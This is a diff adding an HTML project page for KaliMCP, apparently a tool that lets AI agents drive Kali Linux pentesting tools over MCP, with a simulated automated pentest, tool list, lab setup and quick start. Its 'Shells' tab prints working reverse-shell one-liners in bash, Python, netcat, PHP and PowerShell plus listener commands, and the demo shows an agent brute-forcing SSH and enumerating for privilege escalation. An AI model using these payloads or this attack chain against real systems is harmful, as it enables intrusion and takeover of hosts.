@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>KaliMCP — Kali Linux Pentesting via MCP</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='85'>🐉</text></svg>">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{--bg:#0a0a0f;--p1:#0d0d14;--p2:#12121c;--bd:#1e1e32;--green:#00ff88;--cyan:#00d4ff;--red:#ff3366;--amber:#ffaa00;--purple:#aa66ff;--tx:#e0e0f0;--t2:#7080a0;--t3:#404860;--f:'Inter',sans-serif;--mono:'JetBrains Mono',monospace}
+body{font-family:var(--f);background:var(--bg);color:var(--tx);min-height:100vh;font-size:14px}
+.app{max-width:1100px;margin:0 auto;padding:16px}
+.hero{text-align:center;padding:36px 20px 24px}
+.hero h1{font-size:2.2rem;font-weight:900;letter-spacing:-1px;margin-bottom:6px}
+.hero h1 .g{color:var(--green)}.hero h1 .r{color:var(--red)}
+.hero-sub{font-size:.82rem;color:var(--t2);max-width:600px;margin:0 auto 16px;line-height:1.6}
+.tabs{display:flex;gap:2px;background:var(--p1);border-radius:12px;padding:3px;border:1px solid var(--bd);margin-bottom:14px;overflow-x:auto}
+.tab{padding:9px 16px;border-radius:10px;font-size:.68rem;font-weight:600;color:var(--t3);cursor:pointer;white-space:nowrap;transition:all .12s}
+.tab:hover{color:var(--tx)}.tab.on{background:var(--green);color:#000;font-weight:700}
+.card{background:var(--p1);border-radius:14px;padding:18px;border:1px solid var(--bd);margin-bottom:12px}
+.card-title{font-size:.88rem;font-weight:700;margin-bottom:12px;display:flex;align-items:center;gap:8px}
+.badge{font-size:.48rem;padding:2px 7px;border-radius:4px;font-weight:700;font-family:var(--mono)}
+.bg{background:rgba(0,255,136,.12);color:var(--green)}.br{background:rgba(255,51,102,.12);color:var(--red)}.bc{background:rgba(0,212,255,.12);color:var(--cyan)}.ba{background:rgba(255,170,0,.12);color:var(--amber)}.bp{background:rgba(170,102,255,.12);color:var(--purple)}
+.terminal{background:#000;border-radius:10px;padding:14px;font-family:var(--mono);font-size:.65rem;line-height:1.8;border:1px solid var(--bd);overflow:auto;max-height:420px;white-space:pre-wrap}
+.g2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.g3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px}
+.g4{display:grid;grid-template-columns:repeat(4,1fr);gap:10px}
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-bottom:14px}
+.stat{background:var(--p1);border-radius:12px;padding:14px;border:1px solid var(--bd);text-align:center}
+.stat-v{font-size:1.5rem;font-weight:900;font-family:var(--mono)}.stat-l{font-size:.5rem;color:var(--t3);margin-top:3px;text-transform:uppercase;letter-spacing:.5px}
+.tool{background:var(--p2);border-radius:10px;padding:12px;border:1px solid var(--bd);margin-bottom:5px}
+.tool-n{font-size:.75rem;font-weight:700;font-family:var(--mono);margin-bottom:3px}
+.tool-d{font-size:.58rem;color:var(--t2);line-height:1.5}
+.btn{padding:7px 18px;border-radius:10px;background:var(--green);color:#000;border:none;font-size:.75rem;font-weight:700;cursor:pointer}
+.demo-input{width:100%;padding:9px 12px;border-radius:10px;background:var(--p2);border:1px solid var(--bd);color:var(--tx);font-family:var(--mono);font-size:.75rem;margin-bottom:8px}
+.demo-input:focus{outline:none;border-color:var(--green);box-shadow:0 0 15px rgba(0,255,136,.1)}
+@media(max-width:768px){.stats,.g4{grid-template-columns:1fr 1fr}.g2,.g3{grid-template-columns:1fr}}
+</style>
+</head>
+<body><div class="app">
+<div class="hero">
+<div style="display:inline-flex;gap:6px;padding:4px 14px;border-radius:20px;background:rgba(0,255,136,.08);border:1px solid rgba(0,255,136,.2);font-size:.6rem;color:var(--green);font-family:var(--mono);margin-bottom:14px">🐉 Kali Linux + Model Context Protocol</div>
+<h1><span class="g">Kali</span><span class="r">MCP</span></h1>
+<p class="hero-sub">Automate Kali Linux pentesting with MCP — 27 tools, SSH/reverse shell management, Docker test mode. For CTFs, security research, and automated reporting.</p>
+<div style="font-size:.65rem;color:var(--t3)">Ali AlEnezi · @SiteQ8 · NBK Group 🇰🇼</div>
+</div>
+<div class="tabs"><div class="tab on" onclick="sT(this,'o')">📊 Overview</div><div class="tab" onclick="sT(this,'t')">🔧 27 Tools</div><div class="tab" onclick="sT(this,'d')">🎯 Demo</div><div class="tab" onclick="sT(this,'s')">🐚 Shells</div><div class="tab" onclick="sT(this,'l')">🐳 Docker Labs</div><div class="tab" onclick="sT(this,'q')">⚡ Quick Start</div></div>
+<div id="c"></div>
+</div>
+<script>
+var P='o';function sT(e,t){P=t;document.querySelectorAll('.tab').forEach(function(x){x.classList.remove('on')});e.classList.add('on');R()}
+function R(){var c=document.getElementById('c');({o:rO,t:rT,d:rD,s:rS,l:rL,q:rQ})[P]()}
+
+function rO(){var c=document.getElementById('c');
+c.innerHTML='<div class="stats"><div class="stat"><div class="stat-v" style="color:var(--green)">27</div><div class="stat-l">MCP Tools</div></div><div class="stat"><div class="stat-v" style="color:var(--cyan)">8</div><div class="stat-l">Categories</div></div><div class="stat"><div class="stat-v" style="color:var(--amber)">6</div><div class="stat-l">Shell Types</div></div><div class="stat"><div class="stat-v" style="color:var(--red)">5</div><div class="stat-l">Docker Labs</div></div></div>';
+var cats=[{n:'🔍 Recon',c:'var(--green)',t:['nmap_scan (8 profiles)','masscan_scan','dns_enum','whois_lookup','theharvester']},
+{n:'🌐 Web',c:'var(--cyan)',t:['nikto_scan','dirb_scan','gobuster_scan','sqlmap_scan','whatweb_scan','wfuzz_scan']},
+{n:'🔐 Exploit',c:'var(--red)',t:['searchsploit','hydra_attack','msf_search']},
+{n:'🔑 Password',c:'var(--amber)',t:['john_crack','hashid']},
+{n:'🕵️ OSINT',c:'var(--purple)',t:['subfinder_scan','amass_enum']},
+{n:'🛡️ Post-Exploit',c:'var(--red)',t:['enumerate_system','linpeas']},
+{n:'🐚 Shell',c:'var(--green)',t:['ssh_connect','ssh_exec','reverse_shell_listener','list_sessions']},
+{n:'📁 Files + 📋 Report',c:'var(--cyan)',t:['file_upload','file_download','generate_report','docker_lab_setup']}];
+c.innerHTML+='<div class="g4">'+cats.map(function(ca){return '<div class="card"><div class="card-title" style="font-size:.78rem;color:'+ca.c+'">'+ca.n+'</div>'+ca.t.map(function(t){return '<div style="font-size:.6rem;color:var(--t2);padding:2px 0;font-family:var(--mono)">• '+t+'</div>'}).join('')+'</div>'}).join('')+'</div>'}
+
+function rT(){var c=document.getElementById('c');
+var tools=[
+{n:'nmap_scan',d:'8 scan profiles: quick, default, full, udp, stealth, vuln, os, aggressive. Custom ports and scripts.',c:'var(--green)',cat:'RECON'},
+{n:'masscan_scan',d:'Ultra-fast port scanner. Full 65535 port scan in seconds with configurable rate.',c:'var(--green)',cat:'RECON'},
+{n:'dns_enum',d:'DNS enumeration via dnsenum, dnsrecon, or fierce. Subdomain discovery + zone transfer.',c:'var(--green)',cat:'RECON'},
+{n:'whois_lookup',d:'WHOIS domain and IP registration lookup.',c:'var(--green)',cat:'RECON'},
+{n:'theharvester',d:'Harvest emails, subdomains, IPs from search engines, PGP servers, and social media.',c:'var(--green)',cat:'RECON'},
+{n:'nikto_scan',d:'Web server vulnerability scanner — 6700+ tests, outdated software, misconfigurations.',c:'var(--cyan)',cat:'WEB'},
+{n:'dirb_scan',d:'Web directory brute-force with common.txt wordlist.',c:'var(--cyan)',cat:'WEB'},
+{n:'gobuster_scan',d:'Directory, DNS, and vhost enumeration. 50 concurrent threads.',c:'var(--cyan)',cat:'WEB'},
+{n:'sqlmap_scan',d:'Automated SQL injection detection. Configurable level and risk.',c:'var(--cyan)',cat:'WEB'},
+{n:'whatweb_scan',d:'Technology fingerprinting — CMS, frameworks, server software, plugins.',c:'var(--cyan)',cat:'WEB'},
+{n:'wfuzz_scan',d:'Web application fuzzer — parameter fuzzing with custom wordlists.',c:'var(--cyan)',cat:'WEB'},
+{n:'searchsploit',d:'Search Exploit-DB offline database. Returns matching exploits + shellcodes as JSON.',c:'var(--red)',cat:'EXPLOIT'},
+{n:'hydra_attack',d:'Network login brute-force — SSH, FTP, HTTP-POST, SMB, RDP, MySQL, and more.',c:'var(--red)',cat:'EXPLOIT'},
+{n:'msf_search',d:'Metasploit module search — find exploits, payloads, auxiliaries.',c:'var(--red)',cat:'EXPLOIT'},
+{n:'john_crack',d:'John the Ripper password cracker with wordlist and format support.',c:'var(--amber)',cat:'PASSWORD'},
+{n:'hashid',d:'Hash type identification — MD5, SHA, bcrypt, NTLM, etc.',c:'var(--amber)',cat:'PASSWORD'},
+{n:'subfinder_scan',d:'Fast passive subdomain discovery using multiple sources.',c:'var(--purple)',cat:'OSINT'},
+{n:'amass_enum',d:'Amass passive subdomain enumeration — comprehensive DNS intel.',c:'var(--purple)',cat:'OSINT'},
+{n:'enumerate_system',d:'Local privesc recon: hostname, kernel, users, SUID, cron, network, processes.',c:'var(--red)',cat:'POST-EXPLOIT'},
+{n:'linpeas',d:'Download latest LinPEAS privilege escalation scanner.',c:'var(--red)',cat:'POST-EXPLOIT'},
+{n:'ssh_connect',d:'Establish SSH session with password or key auth.',c:'var(--green)',cat:'SHELL'},
+{n:'ssh_exec',d:'Execute commands on established SSH sessions.',c:'var(--green)',cat:'SHELL'},
+{n:'reverse_shell_listener',d:'Generate payloads (bash, python, nc, php, powershell, perl) + nc/msf listener.',c:'var(--green)',cat:'SHELL'},
+{n:'list_sessions',d:'List all active SSH and shell sessions.',c:'var(--green)',cat:'SHELL'},
+{n:'file_upload',d:'Stage file for transfer with multiple methods (HTTP, nc, base64, scp).',c:'var(--cyan)',cat:'FILE'},
+{n:'file_download',d:'Download file from URL to results directory.',c:'var(--cyan)',cat:'FILE'},
+{n:'generate_report',d:'Generate JSON pentest report with severity stats and risk rating.',c:'var(--amber)',cat:'REPORT'}
+];
+c.innerHTML=tools.map(function(t){return '<div class="tool"><div class="tool-n" style="color:'+t.c+'">'+t.n+' <span class="badge" style="background:'+t.c+'20;color:'+t.c+'">'+t.cat+'</span></div><div class="tool-d">'+t.d+'</div></div>'}).join('')}
+
+function rD(){var c=document.getElementById('c');
+c.innerHTML='<div class="card"><div class="card-title">🎯 Full Pentest Agent Simulation</div><div style="display:flex;gap:8px;margin-bottom:10px"><input class="demo-input" id="dt" value="10.10.10.1" style="flex:1" placeholder="Target IP or domain"><button class="btn" onclick="runPentestDemo()">▶ Launch Pentest</button></div><div class="terminal" id="do" style="min-height:380px"><span style="color:var(--t2)">Enter target and click Launch.</span></div></div>'}
+
+var steps=[
+{d:300,t:'<span style="color:var(--green)">[KaliMCP]</span> <span style="color:var(--cyan)">Initializing automated pentest agent...</span>'},
+{d:400,t:'<span style="color:var(--green)">[KaliMCP]</span> Connected — 27 tools available across 8 categories'},
+{d:200,t:''},
+{d:200,t:'<span style="color:var(--amber)">[PHASE 1: RECON]</span> <span style="color:var(--purple)">nmap_scan({T}, type=default)</span>'},
+{d:1200,t:'<span style="color:var(--t2)">  PORT     STATE  SERVICE     VERSION\n  22/tcp   open   ssh         OpenSSH 8.2p1\n  80/tcp   open   http        Apache 2.4.49\n  443/tcp  open   https       nginx 1.18\n  3306/tcp open   mysql       MySQL 8.0.28\n  8080/tcp open   http-proxy  Tomcat 9.0.56</span>'},
+{d:200,t:''},
+{d:200,t:'<span style="color:var(--amber)">[PHASE 2: WEB]</span> <span style="color:var(--purple)">whatweb_scan(http://{T})</span>'},
+{d:800,t:'<span style="color:var(--t2)">  Apache 2.4.49, PHP 7.4.3, WordPress 5.8\n  <span style="color:var(--red)">[!] Apache 2.4.49 — CVE-2021-41773 Path Traversal!</span></span>'},
+{d:200,t:''},
+{d:200,t:'<span style="color:var(--amber)">[PHASE 2: WEB]</span> <span style="color:var(--purple)">gobuster_scan(http://{T})</span>'},
+{d:1000,t:'<span style="color:var(--t2)">  /admin          (Status: 200)\n  /wp-admin       (Status: 302)\n  /wp-login.php   (Status: 200)\n  /backup         (Status: 200)\n  /phpmyadmin     (Status: 200)\n  <span style="color:var(--red)">[!] /backup and /phpmyadmin exposed!</span></span>'},
+{d:200,t:''},
+{d:200,t:'<span style="color:var(--amber)">[PHASE 3: EXPLOIT]</span> <span style="color:var(--purple)">searchsploit("Apache 2.4.49")</span>'},
+{d:600,t:'<span style="color:var(--red)">  Apache 2.4.49 - Path Traversal & RCE (CVE-2021-41773)\n  Apache 2.4.50 - Path Traversal & RCE (CVE-2021-42013)\n  2 exploits found in Exploit-DB</span>'},
+{d:200,t:''},
+{d:200,t:'<span style="color:var(--amber)">[PHASE 3: EXPLOIT]</span> <span style="color:var(--purple)">hydra_attack({T}, ssh, user=admin)</span>'},
+{d:1400,t:'<span style="color:var(--t2)">  [22][ssh] host: {T}   login: admin   password: <span style="color:var(--red)">admin123</span>\n  <span style="color:var(--red)">1 valid password found!</span></span>'},
+{d:200,t:''},
+{d:200,t:'<span style="color:var(--amber)">[PHASE 4: ACCESS]</span> <span style="color:var(--purple)">ssh_connect({T}, admin)</span>'},
+{d:500,t:'<span style="color:var(--green)">  Session established: ssh_{T}_admin_142035\n  Connected as admin@{T}</span>'},
+{d:200,t:''},
+{d:200,t:'<span style="color:var(--amber)">[PHASE 5: POST-EXPLOIT]</span> <span style="color:var(--purple)">enumerate_system()</span>'},
+{d:900,t:'<span style="color:var(--t2)">  Kernel: Linux 5.4.0 #1 SMP x86_64\n  Users: root, admin, mysql, www-data\n  <span style="color:var(--red)">SUID: /usr/bin/pkexec (CVE-2021-4034 PwnKit!)</span>\n  Cron: backup.sh runs as root every 5 min\n  MySQL running as root</span>'},
+{d:200,t:''},
+{d:200,t:'<span style="color:var(--amber)">[PHASE 6: REPORT]</span> <span style="color:var(--purple)">generate_report({T})</span>'},
+{d:600,t:'<span style="color:var(--green)">  ══════════════════════════════════════\n  PENTEST COMPLETE\n  Risk: <span style="color:var(--red)">CRITICAL</span>\n  Findings: 3 Critical, 2 High, 4 Medium\n  Time: ~12 seconds (est. manual: 8+ hours)\n  Report: results/report_{T}.json\n  ══════════════════════════════════════</span>'}
+];
+function runPentestDemo(){var t=document.getElementById('dt').value||'10.10.10.1',o=document.getElementById('do'),td=0;o.innerHTML='';
+steps.forEach(function(s){td+=s.d;setTimeout(function(){o.innerHTML+=s.t.replace(/\{T\}/g,t)+'\n';o.scrollTop=o.scrollHeight},td)})}
+
+function rS(){var c=document.getElementById('c');
+c.innerHTML='<div class="card"><div class="card-title">🐚 Reverse Shell Generator</div><div class="g2"><div><div style="font-size:.72rem;font-weight:700;color:var(--green);margin-bottom:8px">Listener</div><div class="terminal">nc -lvnp 4444\n\n<span style="color:var(--t3)"># Or with Metasploit:</span>\nmsfconsole -q -x "use exploit/multi/handler;\nset PAYLOAD generic/shell_reverse_tcp;\nset LHOST 0.0.0.0;\nset LPORT 4444;\nrun"</div></div><div><div style="font-size:.72rem;font-weight:700;color:var(--red);margin-bottom:8px">Payloads (replace LHOST/LPORT)</div><div class="terminal"><span style="color:var(--green)"># Bash</span>\nbash -i >& /dev/tcp/LHOST/4444 0>&1\n\n<span style="color:var(--green)"># Python</span>\npython3 -c \'import socket,subprocess,os;\ns=socket.socket();s.connect(("LHOST",4444));\nos.dup2(s.fileno(),0);os.dup2(s.fileno(),1);\nos.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'\n\n<span style="color:var(--green)"># Netcat</span>\nnc -e /bin/sh LHOST 4444\n\n<span style="color:var(--green)"># PHP</span>\nphp -r \'$s=fsockopen("LHOST",4444);\nexec("/bin/sh -i <&3 >&3 2>&3");\'\n\n<span style="color:var(--green)"># PowerShell</span>\npowershell -nop -c "$c=New-Object\nNet.Sockets.TCPClient(\'LHOST\',4444)..."</div></div></div></div>';
+c.innerHTML+='<div class="card"><div class="card-title">🔑 TTY Upgrade</div><div class="terminal"><span style="color:var(--green)"># Step 1: Spawn TTY</span>\npython3 -c \'import pty; pty.spawn("/bin/bash")\'\n\n<span style="color:var(--green)"># Step 2: Background shell</span>\nCtrl+Z\n\n<span style="color:var(--green)"># Step 3: Fix terminal</span>\nstty raw -echo; fg\nexport TERM=xterm</div></div>'}
+
+function rL(){var c=document.getElementById('c');
+var labs=[{n:'DVWA',d:'Damn Vulnerable Web App — SQL injection, XSS, file upload, command injection',cmd:'docker run -d -p 8081:80 --name dvwa vulnerables/web-dvwa',url:'localhost:8081',cred:'admin / password',c:'var(--red)'},
+{n:'Juice Shop',d:'OWASP Juice Shop — modern JS vulnerabilities, API attacks, XSS, injection',cmd:'docker run -d -p 3000:3000 --name juice bkimminich/juice-shop',url:'localhost:3000',cred:'Create account',c:'var(--amber)'},
+{n:'Metasploitable',d:'Intentionally vulnerable Linux — SSH, FTP, Samba, VSFTPD backdoor, PostgreSQL',cmd:'docker run -d -p 8082:80 -p 2222:22 --name meta tleemcjr/metasploitable2',url:'localhost:8082',cred:'msfadmin / msfadmin',c:'var(--red)'},
+{n:'WebGoat',d:'OWASP WebGoat — guided web security lessons with hands-on challenges',cmd:'docker run -d -p 8083:8080 --name webgoat webgoat/webgoat',url:'localhost:8083/WebGoat',cred:'Register',c:'var(--cyan)'},
+{n:'Hackazon',d:'Modern e-commerce app with OWASP Top 10 vulnerabilities',cmd:'docker run -d -p 8084:80 --name hackazon ianwijaya/hackazon',url:'localhost:8084',cred:'test@test.com / test',c:'var(--purple)'}];
+c.innerHTML='<div class="card"><div class="card-title">🐳 Docker Vulnerable Labs <span class="badge bg">Safe Testing</span></div><p style="font-size:.72rem;color:var(--t2);margin-bottom:12px">Spin up vulnerable targets in Docker for safe pentesting practice.</p></div>';
+c.innerHTML+=labs.map(function(l){return '<div class="card"><div class="card-title" style="color:'+l.c+'">'+l.n+' <span class="badge" style="background:'+l.c+'20;color:'+l.c+'">'+l.url+'</span></div><div style="font-size:.68rem;color:var(--t2);margin-bottom:8px">'+l.d+'</div><div class="terminal" style="font-size:.62rem">$ '+l.cmd+'</div><div style="font-size:.58rem;color:var(--t3);margin-top:6px">Credentials: '+l.cred+'</div></div>'}).join('')}
+
+function rQ(){var c=document.getElementById('c');
+c.innerHTML='<div class="card"><div class="card-title">⚡ Quick Start</div><div class="terminal" style="font-size:.72rem"><span style="color:var(--green)">$</span> <span style="color:var(--cyan)">git clone https://github.com/SiteQ8/KaliMCP.git</span>\n<span style="color:var(--green)">$</span> <span style="color:var(--cyan)">cd KaliMCP</span>\n<span style="color:var(--green)">$</span> <span style="color:var(--cyan)">python3 scripts/kalimcp_server.py --port 7070</span>\n\n<span style="color:var(--t3)"># Call a tool</span>\n<span style="color:var(--green)">$</span> <span style="color:var(--cyan)">curl -X POST http://localhost:7070 \\</span>\n  <span style="color:var(--cyan)">-H "Content-Type: application/json" \\</span>\n  <span style="color:var(--cyan)">-d \'{"method":"tools/call","params":{"name":"nmap_scan","arguments":{"target":"10.10.10.1","scan_type":"vuln"}}}\'</span>\n\n<span style="color:var(--t3)"># List all tools</span>\n<span style="color:var(--green)">$</span> <span style="color:var(--cyan)">curl -X POST http://localhost:7070 -d \'{"method":"tools/list"}\'</span>\n\n<span style="color:var(--t3)"># Docker test mode (with vulnerable labs)</span>\n<span style="color:var(--green)">$</span> <span style="color:var(--cyan)">python3 scripts/kalimcp_server.py --docker-mode</span></div></div>';
+c.innerHTML+='<div class="card"><div class="card-title">📋 Example: Full Pentest Workflow</div><div class="terminal" style="font-size:.68rem"><span style="color:var(--t3)"># 1. Recon</span>\n<span style="color:var(--cyan)">tools/call → nmap_scan(target, "aggressive")</span>\n<span style="color:var(--cyan)">tools/call → dns_enum(domain)</span>\n\n<span style="color:var(--t3)"># 2. Web Enumeration</span>\n<span style="color:var(--cyan)">tools/call → whatweb_scan(url)</span>\n<span style="color:var(--cyan)">tools/call → gobuster_scan(url)</span>\n<span style="color:var(--cyan)">tools/call → nikto_scan(url)</span>\n\n<span style="color:var(--t3)"># 3. Vulnerability Scanning</span>\n<span style="color:var(--cyan)">tools/call → sqlmap_scan(url + "?id=1")</span>\n<span style="color:var(--cyan)">tools/call → searchsploit("Apache 2.4.49")</span>\n\n<span style="color:var(--t3)"># 4. Exploitation</span>\n<span style="color:var(--cyan)">tools/call → hydra_attack(target, "ssh")</span>\n<span style="color:var(--cyan)">tools/call → ssh_connect(target, "admin", "password")</span>\n\n<span style="color:var(--t3)"># 5. Post-Exploitation</span>\n<span style="color:var(--cyan)">tools/call → enumerate_system()</span>\n<span style="color:var(--cyan)">tools/call → linpeas()</span>\n\n<span style="color:var(--t3)"># 6. Report</span>\n<span style="color:var(--cyan)">tools/call → generate_report(target, findings)</span></div></div>'}
+
+R();
+</script>
+</body>
+</html>
